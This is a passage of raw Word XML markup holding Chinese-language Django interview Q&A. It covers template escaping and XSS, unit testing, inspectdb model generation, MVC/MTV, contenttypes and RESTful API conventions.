        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>xss</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>攻击：</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> '|safe'</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'mark_safe'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B3D33F7" w14:textId="7FB6B12D"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049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中如何实现单元测试？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45FF31D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对于每一个测试方法都会将</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>setUp()</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>tearDown()</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方法执行一遍</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A27FE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会单独新建一个测试数据库来进行数据库的操作方面的测试，默认在测试完成后销毁。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B52458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在测试方法中对数据库进行增删操作，最后都会被清除。也就是说，在</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>test_add</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中插入的数据，在</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>test_add</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>测试结束后插入的数据会被清除。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E42292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django</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>单元测试时为了模拟生产环境，会修改</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>settings</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中的变量，例如</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把</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>DEBUG</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>变量修改为</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">True, </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>把</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>ALLOWED_HOSTS</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>修改为</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p>
    <w:p w14:paraId="279A7F1E" w14:textId="794589D9"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051</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中如何根据数据库表生成</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>model</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>中的类？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D0B621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1</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、修改</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>seting</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>文件，在</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>setting</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>里面设置要连接的数据库类型和名称、地址</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68BFBF8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2</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、运行下面代码可以自动生成</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>models</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>模型文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F24C6A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python manage.py inspectdb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60E628F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3</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、创建一个</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执行下下面代码：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78BDA6C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python manage.py inspectdb &gt; app/models.py </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5753EBD9" w14:textId="220EEB4E"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053</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简述</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>MVC</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MTV</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="498BD18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MVC</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model</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view(</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>模块</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controller(</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>视图</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13F1FEE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MTV</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model</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tempalte</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 xml:space="preserve">view </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45CC11F2" w14:textId="4F69BDD7"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054</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w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>contenttype</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>组件的作用？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40D955B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contenttype</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>是</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的一个组件</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，它可以将</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>下所有</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下的表记录下来</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CB94CE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可以使用他再加上表中的两个字段</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实现一张表和</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>张表动态创建</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>FK</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>关系。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BC81F7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字段：表名称</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="676B370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字段：数据行</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>ID</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="172BB10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应用：路飞表结构优惠券和专题课和学位课关联</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58E65462" w14:textId="7DA2102E"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055</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谈谈你对</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve">restfull </w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>规范的认识？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1740083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restful</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>其实就是一套编写接口的</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协议</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，规定如何编写以及如何设置返回值、状态码等信息。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E8742C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最显著的特点：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7619933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w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>用</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">restful: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E32D89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给用户一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，根据</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>method</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>不同在后端做不同的处理</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FACDB4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比如：</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>post</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>创建数据、</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>get</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>获取数据、</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>put</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>patch</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>修改数据、</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>delete</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>删除数据。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7564D6E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不用</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">restful: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="389571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给调用者很多</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，每个</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>代表一个功能，比如：</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>add_user/delte_user/edit_user/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58267E8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当然，还有协议其他的，比如：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57D149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版本</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来控制让程序有多个版本共存的情况，版本可以放在</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> url</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、请求头（</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>accept/</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>自定义）、</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
